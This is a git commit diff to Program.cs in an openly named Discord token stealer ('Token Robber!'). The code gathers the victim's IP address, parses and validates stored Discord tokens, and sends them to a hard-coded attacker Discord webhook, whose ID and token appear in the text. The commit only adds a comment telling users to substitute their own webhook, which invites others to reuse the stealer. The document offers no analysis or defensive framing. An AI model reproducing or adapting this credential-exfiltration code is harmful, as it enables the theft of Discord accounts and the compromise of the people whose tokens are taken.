87eca5c360cfd3b7d4ad74b587245af5949c1de0
EbicHecker <sxpremecrypt@pm.me>
2021-12-07 19:59:53 +0100

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -13,7 +13,7 @@ public static class Program
             .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
             .AppendLine("Tokens: ");
         await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await AppendSummaryIfValid(token, content, cts));
-        using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C");
+        using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C"); // Replace with your own.
         await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
     }
 
